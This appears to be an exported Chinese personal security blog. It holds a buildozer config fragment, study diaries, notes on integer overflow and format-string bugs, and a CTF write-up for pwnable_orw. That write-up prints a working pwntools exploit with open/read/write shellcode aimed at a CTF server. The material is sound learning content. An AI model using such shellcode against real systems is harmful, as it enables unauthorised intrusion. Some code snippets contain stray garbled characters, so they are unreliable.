public storage (False)</span></span><br><span class="line"><span class="meta">#android.private_storage = True</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android NDK directory (if empty, it will be automatically downloaded.)</span></span><br><span class="line"><span class="meta">#android.ndk_path =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android SDK directory (if empty, it will be automatically downloaded.)</span></span><br><span class="line"><span class="meta">#android.sdk_path =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) ANT directory (if empty, it will be automatically downloaded.)</span></span><br><span class="line"><span class="meta">#android.ant_path =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) If True, then skip trying to update the Android sdk</span></span><br><span class="line"><span class="meta"># This can be useful to avoid excess Internet downloads or save time</span></span><br><span class="line"><span class="meta"># when an update is due and you just want to test/build your package</span></span><br><span class="line"><span class="meta"># android.skip_update = False</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) If True, then automatically accept SDK license</span></span><br><span class="line"><span class="meta"># agreements. This is intended for automation only. If set to False,</span></span><br><span class="line"><span class="meta"># the default, you will be shown the license when first running</span></span><br><span class="line"><span class="meta"># buildozer.</span></span><br><span class="line"><span class="meta"># android.accept_sdk_license = False</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android entry point, default is ok for Kivy-based app</span></span><br><span class="line"><span class="meta">#android.entrypoint = org.renpy.android.PythonActivity</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android app theme, default is ok for Kivy-based app</span></span><br><span class="line"><span class="meta"># android.apptheme = &quot;@android:style/Theme.NoTitleBar&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Pattern to whitelist for the whole project</span></span><br><span class="line"><span class="meta">#android.whitelist =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to a custom whitelist file</span></span><br><span class="line"><span class="meta">#android.whitelist_src =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to a custom blacklist file</span></span><br><span class="line"><span class="meta">#android.blacklist_src =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of Java .jar files to add to the libs so that pyjnius can access</span></span><br><span class="line"><span class="meta"># their classes. Don&#x27;t add jars that you do not need, since extra jars can slow</span></span><br><span class="line"><span class="meta"># down the build process. Allows wildcards matching, for example:</span></span><br><span class="line"><span class="meta"># OUYA-ODK/libs/*.jar</span></span><br><span class="line"><span class="meta">#android.add_jars = foo.jar,bar.jar,path/to/more/*.jar</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of Java files to add to the android project (can be java or a</span></span><br><span class="line"><span class="meta"># directory containing the files)</span></span><br><span class="line"><span class="meta">#android.add_src =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android AAR archives to add (currently works only with sdl2_gradle</span></span><br><span class="line"><span class="meta"># bootstrap)</span></span><br><span class="line"><span class="meta">#android.add_aars =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Gradle dependencies to add (currently works only with sdl2_gradle</span></span><br><span class="line"><span class="meta"># bootstrap)</span></span><br><span class="line"><span class="meta">#android.gradle_dependencies =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) add java compile options</span></span><br><span class="line"><span class="meta"># this can for example be necessary when importing certain java libraries using the &#x27;android.gradle_dependencies&#x27; option</span></span><br><span class="line"><span class="meta"># see https://developer.android.com/studio/write/java8-support for further information</span></span><br><span class="line"><span class="meta"># android.add_compile_options = &quot;sourceCompatibility = 1.8&quot;, &quot;targetCompatibility = 1.8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Gradle repositories to add &#123;can be necessary for some android.gradle_dependencies&#125;</span></span><br><span class="line"><span class="meta"># please enclose in double quotes </span></span><br><span class="line"><span class="meta"># e.g. android.gradle_repositories = &quot;maven &#123; url &#x27;https://kotlin.bintray.com/ktor&#x27; &#125;&quot;</span></span><br><span class="line"><span class="meta">#android.add_gradle_repositories =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) packaging options to add </span></span><br><span class="line"><span class="meta"># see https://google.github.io/android-gradle-dsl/current/com.android.build.gradle.internal.dsl.PackagingOptions.html</span></span><br><span class="line"><span class="meta"># can be necessary to solve conflicts in gradle_dependencies</span></span><br><span class="line"><span class="meta"># please enclose in double quotes </span></span><br><span class="line"><span class="meta"># e.g. android.add_packaging_options = &quot;exclude &#x27;META-INF/common.kotlin_module&#x27;&quot;, &quot;exclude &#x27;META-INF/*.kotlin_module&#x27;&quot;</span></span><br><span class="line"><span class="meta">#android.add_gradle_repositories =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Java classes to add as activities to the manifest.</span></span><br><span class="line"><span class="meta">#android.add_activities = com.example.ExampleActivity</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) OUYA Console category. Should be one of GAME or APP</span></span><br><span class="line"><span class="meta"># If you leave this blank, OUYA support will not be enabled</span></span><br><span class="line"><span class="meta">#android.ouya.category = GAME</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Filename of OUYA Console icon. It must be a 732x412 png image.</span></span><br><span class="line"><span class="meta">#android.ouya.icon.filename = %(source.dir)s/data/ouya_icon.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) XML file to include as an intent filters in &lt;activity&gt; tag</span></span><br><span class="line"><span class="meta">#android.manifest.intent_filters =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) launchMode to set for the main activity</span></span><br><span class="line"><span class="meta">#android.manifest.launch_mode = standard</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android additional libraries to copy into libs/armeabi</span></span><br><span class="line"><span class="meta">#android.add_libs_armeabi = libs/android/*.so</span></span><br><span class="line"><span class="meta">#android.add_libs_armeabi_v7a = libs/android-v7/*.so</span></span><br><span class="line"><span class="meta">#android.add_libs_arm64_v8a = libs/android-v8/*.so</span></span><br><span class="line"><span class="meta">#android.add_libs_x86 = libs/android-x86/*.so</span></span><br><span class="line"><span class="meta">#android.add_libs_mips = libs/android-mips/*.so</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Indicate whether the screen should stay on</span></span><br><span class="line"><span class="meta"># Don&#x27;t forget to add the WAKE_LOCK permission if you set this to True</span></span><br><span class="line"><span class="meta">#android.wakelock = False</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android application meta-data to set (key=value format)</span></span><br><span class="line"><span class="meta">#android.meta_data =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android library project to add (will be added in the</span></span><br><span class="line"><span class="meta"># project.properties automatically.)</span></span><br><span class="line"><span class="meta">#android.library_references =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android shared libraries which will be added to AndroidManifest.xml using &lt;uses-library&gt; tag</span></span><br><span class="line"><span class="meta">#android.uses_library =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android logcat filters to use</span></span><br><span class="line"><span class="meta">#android.logcat_filters = *:S python:D</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Copy library instead of making a libpymodules.so</span></span><br><span class="line"><span class="meta">#android.copy_libs = 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) The Android arch to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64</span></span><br><span class="line">android.arch = armeabi-v7a</span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) overrides automatic versionCode computation (used in build.gradle)</span></span><br><span class="line"><span class="meta"># this is not the same as app version and should only be edited if you know what you&#x27;re doing</span></span><br><span class="line"><span class="meta"># android.numeric_version = 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#(bool) enables Android auto backup feature (Android API &gt;=23)</span></span><br><span class="line">android.allow_backup = True</span><br><span class="line"></span><br><span class="line"><span class="meta">#(str) XML file for custom backup rules (see official auto backup documentation)</span></span><br><span class="line"><span class="meta">#android.backup_rules =</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#(str) If you need to insert variables into your AndroidManifest.xml file,</span></span><br><span class="line"><span class="meta">#you can do so with the manifestPlaceholders property.</span></span><br><span class="line"><span class="meta">#This property takes a map of key-value pairs. (via a string)</span></span><br><span class="line"><span class="meta">#Usage example : android.manifest_placeholders = [myCustomUrl:&quot;org.kivy.customurl&quot;]</span></span><br><span class="line"><span class="meta">#android.manifest_placeholders = [:]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#(bool) disables the compilation of py to pyc/pyo files when packaging</span></span><br><span class="line"><span class="meta">#android.no-compile-pyo = True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># Python for android (p4a) specific</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) python-for-android fork to use, defaults to upstream (kivy)</span></span><br><span class="line"><span class="meta">#p4a.fork = kivy</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) python-for-android branch to use, defaults to master</span></span><br><span class="line"><span class="meta">#p4a.branch = master</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) python-for-android git clone directory (if empty, it will be automatically cloned from github)</span></span><br><span class="line"><span class="meta">#p4a.source_dir =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) The directory in which python-for-android should look for your own build recipes (if any)</span></span><br><span class="line"><span class="meta">#p4a.local_recipes =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Filename to the hook for p4a</span></span><br><span class="line"><span class="meta">#p4a.hook =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Bootstrap to use for android builds</span></span><br><span class="line"><span class="meta"># p4a.bootstrap = sdl2</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) port number to specify an explicit --port= p4a argument (eg for bootstrap flask)</span></span><br><span class="line"><span class="meta">#p4a.port =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># Control passing the --use-setup-py vs --ignore-setup-py to p4a</span></span><br><span class="line"><span class="meta"># &quot;in the future&quot; --use-setup-py is going to be the default behaviour in p4a, right now it is not</span></span><br><span class="line"><span class="meta"># Setting this to false will pass --ignore-setup-py, true will pass --use-setup-py</span></span><br><span class="line"><span class="meta"># NOTE: this is general setuptools integration, having pyproject.toml is enough, no need to generate</span></span><br><span class="line"><span class="meta"># setup.py if you&#x27;re using Poetry, but you need to add &quot;toml&quot; to source.include_exts.</span></span><br><span class="line"><span class="meta">#p4a.setup_py = false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># iOS specific</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to a custom kivy-ios folder</span></span><br><span class="line"><span class="meta">#ios.kivy_ios_dir = ../kivy-ios</span></span><br><span class="line"><span class="meta"># Alternately, specify the URL and branch of a git checkout:</span></span><br><span class="line">ios.kivy_ios_url = https:<span class="comment">//github.com/kivy/kivy-ios</span></span><br><span class="line">ios.kivy_ios_branch = master</span><br><span class="line"></span><br><span class="line"><span class="meta"># Another platform dependency: ios-deploy</span></span><br><span class="line"><span class="meta"># Uncomment to use a custom checkout</span></span><br><span class="line"><span class="meta">#ios.ios_deploy_dir = ../ios_deploy</span></span><br><span class="line"><span class="meta"># Or specify URL and branch</span></span><br><span class="line">ios.ios_deploy_url = https:<span class="comment">//github.com/phonegap/ios-deploy</span></span><br><span class="line">ios.ios_deploy_branch = <span class="number">1.10</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Whether or not to sign the code</span></span><br><span class="line">ios.codesign.allowed = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Name of the certificate to use for signing the debug version</span></span><br><span class="line"><span class="meta"># Get a list of available identities: buildozer ios list_identities</span></span><br><span class="line"><span class="meta">#ios.codesign.debug = &quot;iPhone Developer: &lt;lastname&gt; &lt;firstname&gt; (&lt;hexstring&gt;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Name of the certificate to use for signing the release version</span></span><br><span class="line"><span class="meta">#ios.codesign.release = %(ios.codesign.debug)s</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[buildozer]</span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))</span></span><br><span class="line">log_level = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Display warning if buildozer is run as root (0 = False, 1 = True)</span></span><br><span class="line">warn_on_root = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to build artifact storage, absolute or relative to spec file</span></span><br><span class="line"><span class="meta"># build_dir = ./.buildozer</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to build output (i.e. .apk, .ipa) storage</span></span><br><span class="line"><span class="meta"># bin_dir = ./bin</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#    -----------------------------------------------------------------------------</span></span><br><span class="line"><span class="meta">#    List as sections</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#    You can define all the &quot;list&quot; as [section:key].</span></span><br><span class="line"><span class="meta">#    Each line will be considered as a option to the list.</span></span><br><span class="line"><span class="meta">#    Let&#x27;s take [app] / source.exclude_patterns.</span></span><br><span class="line"><span class="meta">#    Instead of doing:</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#[app]</span></span><br><span class="line"><span class="meta">#source.exclude_patterns = license,data/audio/*.wav,data/images/original/*</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#    This can be translated into:</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#[app:source.exclude_patterns]</span></span><br><span class="line"><span class="meta">#license</span></span><br><span class="line"><span class="meta">#data/audio/*.wav</span></span><br><span class="line"><span class="meta">#data/images/original/*</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#    -----------------------------------------------------------------------------</span></span><br><span class="line"><span class="meta">#    Profiles</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#    You can extend section / key with a profile</span></span><br><span class="line"><span class="meta">#    For example, you want to deploy a demo version of your application without</span></span><br><span class="line"><span class="meta">#    HD content. You could first change the title to add &quot;(demo)&quot; in the name</span></span><br><span class="line"><span class="meta">#    and extend the excluded directories to remove the HD content.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#[app@demo]</span></span><br><span class="line"><span class="meta">#title = My Application (demo)</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#[app:source.exclude_patterns@demo]</span></span><br><span class="line"><span class="meta">#images/hd/*</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#    Then, invoke the command line with the &quot;demo&quot; profile:</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#buildozer --profile demo android debug</span></span><br></pre></td></tr></table></figure>

<h2 id="hgamectf2022开赛"><a href="#hgamectf2022开赛" class="headerlink" title="hgamectf2022开赛"></a>hgamectf2022开赛</h2><ul>
<li>这两天的hgamectf2022也开始了，题目很新颖，我也学到了不少，但是作为一个pwn手吧，比较丢脸的就是一个pwn题都没做出来，虽然其他方向的题目出了不少，也成功挤进前一百名，但这只是暂时的，我还需要继续努力，把自己的主方向强大起来！</li>
<li>留个图嘿嘿，最高排到39名好像</li>
</ul>
<p><img src="/img/1643119698683.png" alt="1643119698683"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>这一周收获还是挺多的，学会了buildozer打包，见识了新的ctf题型，又下了两个新软件，真的是活到老学到老，只有不断的学习，才不会落后，冲冲冲！</li>
<li>下周好像要开始大一新生的培训了，预计寒假结束还是会给他们进行一个考核赛，这就涉及到需要我们出题，到时候时间会越来越紧，不过这样也过得充实！这个寒假这样过才不算荒废！</li>
</ul>
]]></content>
      <categories>
        <category>2022</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>寒假学习(二)</title>
    <url>/2022/01/30/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%882022.1.24-2022.1.30%EF%BC%89/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="学习进度总结（二）（2022-1-24-2022-1-30）"><a href="#学习进度总结（二）（2022-1-24-2022-1-30）" class="headerlink" title="学习进度总结（二）（2022.1.24-2022.1.30）"></a>学习进度总结（二）（2022.1.24-2022.1.30）</h1><h2 id="作品赛ing"><a href="#作品赛ing" class="headerlink" title="作品赛ing"></a>作品赛ing</h2><p>这周的任务还是衔接上一周的内容，只不过中间出了插曲，电脑遇到不小的问题，再加上临近春节，走亲访友，时间确实抽不太出来，不过也是收获满满的一周。</p>
<h3 id="重装系统"><a href="#重装系统" class="headerlink" title="重装系统"></a>重装系统</h3><ul>
<li>只能说程序猿都是在不断debug的路上逐渐成长的。分区小白的第一次分区果然还是以失败告终，最后以重装系统结束。<del>奶奶的</del>，确实很搞心态，但是每一次的debug和试错，都会让我积累更多的经验，逐渐成为专家。</li>
<li>讲讲我的踩坑记录，也给大家提供一些有参考价值的debug方法。电脑分区失败，无法进入系统的话，最简单也是最粗暴的办法就是用系统盘直接强行进入系统，这种办法即能保全电脑里的大部分文件，还能免去很多不必要的麻烦。我最后是在网上用一个空U盘做的大白菜系统盘，然后进入系统后，拿另一个装机U盘成功拯救我的电脑。真的很有效！</li>
</ul>
<h3 id="拯救博客"><a href="#拯救博客" class="headerlink" title="拯救博客"></a>拯救博客</h3><ul>
<li>电脑是救回来了，但是D盘的东西丢了一大半，其中包括很重要的博客内容，本地保存的全都损坏找不回了。整个人傻住了，但是好在去年九月份拿U盘备份过一次，所以大部分东西还在，但我以为会很顺利就解决了，没想到U盘之前中过毒，后来好不容易恢复回来，居然在我文件里下了很多东西，加载出来很多000001这类的无关数据，删除都没法。hexo的环境也在电脑上全都丢掉了，花了两个小时把环境装上，结果还是部署不上博客，最后只有舍小保大，删掉所有主题配置，重头再来。终于经过两天一夜的抢救，整体博客算是回来了。npm指令真是个稀奇玩意儿。版本对不上hexo的版本，好多不兼容的问题就是加大了任务进展的难度，所以整整花了两天的时间才解决掉。</li>
</ul>
<h3 id="继续解决打包问题"><a href="#继续解决打包问题" class="headerlink" title="继续解决打包问题"></a>继续解决打包问题</h3><ul>
<li>打包软件的问题确实解决好了，但是队友发来的测试软件却还是出现打包后闪退的问题，不知道是不是代码的问题，总之还在调试之中……</li>
</ul>
<h2 id="过年了"><a href="#过年了" class="headerlink" title="过年了"></a>过年了</h2><p>2022年马上就到来了！新年新气象！我与旧事归于尽，来年依旧迎花开！新年快乐!!!</p>
]]></content>
      <categories>
        <category>2022</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>整数安全漏洞</title>
    <url>/2021/07/23/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引，就会产生潜在的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢出发生之后，很难立即被察觉，比较难用一个有效的方法去判断是否出现或者可能出现整数溢出。</p>
<p>关于整数的异常情况主要有三种：<br>(1) 溢出，只有有符号数才会发生溢出。有符号数的最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出。溢出标指OF可检测有符号数的溢出；<br>(2) 回绕，无符号数0-1时会变成最大的数，如1字节的无符号数会变成255，而255+1会变成最小数0.进位标志CF可检测无符号数的回绕；<br>(3) 截断，将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断</p>
<h3 id="漏洞多发函数"><a href="#漏洞多发函数" class="headerlink" title="漏洞多发函数"></a>漏洞多发函数</h3><p>整数溢出要配合其他类型的缺陷才能有用，下面的两个函数都有一个size_t类型的参数（size_t是无符号整数类型的sizeof()的结果），常常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line">void *memcpy(void *dest,const void *src,size_t n);</span><br></pre></td></tr></table></figure>

<p>memcpy()函数将src所指向的字符串中以src地址开始的前n个字节复制到dest所指的数组中，并返回dest。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line">char *strncpy(char *dest, const char *src,size_t n);</span><br></pre></td></tr></table></figure>

<p>strncpy()函数从源src所指的内存地址的起始位置开始复制n个字节到目标dest所指的内存地址的起始位置中。</p>
<p>两个函数中都有一个类型为size_t的参数，它是无符号整型的sizeof运算符的结果。</p>
<pre><code>typedef unsigned int size_t;    h
</code></pre>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable_orw</title>
    <url>/2022/01/21/%E6%B2%99%E7%AE%B1%E5%88%9D%E4%BD%93%E9%AA%8C%EF%BC%88pwnable_orw)/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="沙箱初体验（pwnable-orw"><a href="#沙箱初体验（pwnable-orw" class="headerlink" title="沙箱初体验（pwnable_orw)"></a>沙箱初体验（pwnable_orw)</h1><p>确实很新奇嗷，照着buu上题目顺序来做，没想到这么快就接触到了沙箱的题目，<del>而我堆都还没玩明白</del></p>
<p>那废话不多说，先来看看文件吧。这时候问题就出现了，不知道为啥就被拦下了，附件不让下载。</p>
<p><img src="/img/1643120343756.png" alt="1643120343756"></p>
<p>xs，只好去网上找dalao们写的博客，好巧不巧就发现了这是个沙箱的题目。</p>
<p>于是只好拿网上的图片来看</p>
<p><img src="/img/1643120358026.png" alt="1643120358026"></p>
<p>搞懂了基本原理，那就实操一下，只能利用open、read、write三个函数来读取flag。</p>
<p>看完dalao的博客，真的学到了，居然还有这样的方法来拿flag，<del>哈哈哈哈哈哈</del></p>
<p><img src="/img/1643120371790.png" alt="1643120371790"></p>
<p>最后脚本附上一跑，就真成了<del>（我是二傻子）</del></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27261</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;shellcode:&#x27;</span>, shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2021/07/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>格式化字符串漏洞是<code>PWN</code>题常见的考察点，仅次于栈溢出漏洞。漏洞原因：程序使用了格式化字符串作为参数，并且格式化字符串为用户可控。其中触发格式化字符串漏洞函数主要是<code>printf</code>、<code>sprintf</code>、<code>fprintf</code>、<code>prin</code>等C库中<code>print</code>家族的函数</p>
<h3 id="0x01-格式化字符串介绍"><a href="#0x01-格式化字符串介绍" class="headerlink" title="0x01 格式化字符串介绍"></a>0x01 格式化字符串介绍</h3><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">printf（<span class="string">&quot;格式化字符串&quot;</span>,参数...)</span><br></pre></td></tr></table></figure>

<p>该<code>printf</code>函数的第一个参数是由格式化说明符与字符串组成，用来规定参数用什么格式输出内容。</p>
<p>格式化说明符：</p>
<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">d</span></span> - 十进制 - 输出十进制整数</span><br><span class="line"><span class="tag">%<span class="selector-tag">s</span></span> - 字符串 - 从内存中读取字符串</span><br><span class="line"><span class="tag">%<span class="selector-tag">x</span></span> - 十六进制 - 输出十六进制数</span><br><span class="line"><span class="tag">%<span class="selector-tag">c</span></span> - 字符 - 输出字符</span><br><span class="line"><span class="tag">%<span class="selector-tag">p</span></span> - 指针 - 指针地址</span><br><span class="line"><span class="tag">%<span class="selector-tag">n</span></span> - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;My name is %s&quot;</span>,<span class="string">&quot;Ezreal&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用以后会显示：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">My <span class="built_in">name</span> <span class="keyword">is</span> Ezreal</span><br></pre></td></tr></table></figure>

<p>特别要注意的是<code>%n</code>这个格式化字符串，它的功能是将<code>%n</code>之前打印出来的字符个数，赋值给一个变量。例如：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">0</span>; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the use of %n&quot;</span>, &amp;c);<span class="function">sss</span></span><br><span class="line"><span class="function">    <span class="title">printf</span><span class="params">(<span class="string">&quot;%d\n&quot;</span>, c)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用以后会显示：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">the <span class="keyword">use</span> of <span class="number">11</span></span><br></pre></td></tr></table></figure>

<h3 id="0x02-漏洞形成原因"><a href="#0x02-漏洞形成原因" class="headerlink" title="0x02 漏洞形成原因"></a>0x02 漏洞形成原因</h3><p>1、函数用法：</p>
<p>正常的<code>printf</code>用法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写程序时要规定字符串的格式化说明符，规定参数的输出类型</p>
<p>错误的<code>printf</code>写法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">  <span class="built_in">printf</span>(str);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞形成原因：程序将格式化字符串的输入权交给用户，printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。所以没有参数，代码也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。示例程序：</p>
